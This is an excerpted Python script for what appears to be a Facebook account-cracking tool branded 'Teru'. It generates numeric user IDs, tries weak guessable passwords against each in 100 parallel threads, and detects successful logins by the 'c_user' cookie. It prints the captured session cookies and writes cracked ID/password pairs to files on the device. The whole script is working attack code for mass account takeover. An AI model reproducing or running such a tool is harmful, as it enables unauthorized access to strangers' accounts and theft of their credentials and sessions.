...
logo=(f"""
__/\\\\\\\\\\\__/\\\\\\\\\\\\\\\_______/\\\\\__________/\\\\\\\\\\\____/\\\________/\\\__/\\\\\\\\\\\___________         
 _\/////\\\///__\///////\\\/////______/\\\///\\\______/\\\/////////\\\_\/\\\_______\/\\\_\/////\\\///____________        
  _____\/\\\___________\/\\\_________/\\\/__\///\\\___\//\\\______\///__\/\\\_______\/\\\_____\/\\\_______________       
   _____\/\\\___________\/\\\________/\\\______\//\\\___\////\\\_________\/\\\\\\\\\\\\\\\_____\/\\\_______________      
    _____\/\\\___________\/\\\_______\/\\\_______\/\\\______\////\\\______\/\\\/////////\\\_____\/\\\_______________     
     _____\/\\\___________\/\\\_______\//\\\______/\\\__________\////\\\___\/\\\_______\/\\\_____\/\\\_______________    
      _____\/\\\___________\/\\\________\///\\\__/\\\_____/\\\______\//\\\__\/\\\_______\/\\\_____\/\\\_______________   
       __/\\\\\\\\\\\_______\/\\\__________\///\\\\\/_____\///\\\\\\\\\\\/___\/\\\_______\/\\\__/\\\\\\\\\\\___________  
        _\///////////________\///_____________\/////_________\///////////_____\///________\///__\///////////____________
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
...
def Teru():
    ...
    print(f"\033[1;31m===================")
    print("")
    Teru = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if Teru in ["1"]:
        main()
    if Teru in ["2"]:
        os.system('exit')
def main():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as Teru:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;32m='*50)
        ...
        print(f"\033[1;31m[\033[1;96m•\033[1;31m] \033[1;31mFILE SAVE IN /sdcard/Teru-OK🥰.txt")
        print('\033[1;32m='*50)
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            Teru.submit(rcrack,uid,pwx,tl)
    print ('\033[1;31m==================================================           ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sTeru-AHAMED\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[1;33m[Teru-OK🥰] {uid} • {ps}" '  \n\033[1;33m [🍁]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [😜] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                os.system("espeak \"Teru, OK, ID \"")
                open('/sdcard/Teru-OK🥰.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;32m[Teru-CP😔] \033[1;31m{uid} • {ps}")
                os.system("espeak \"Teru, CP, ID \"")
                open('/sdcard/Teru-CP😔.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
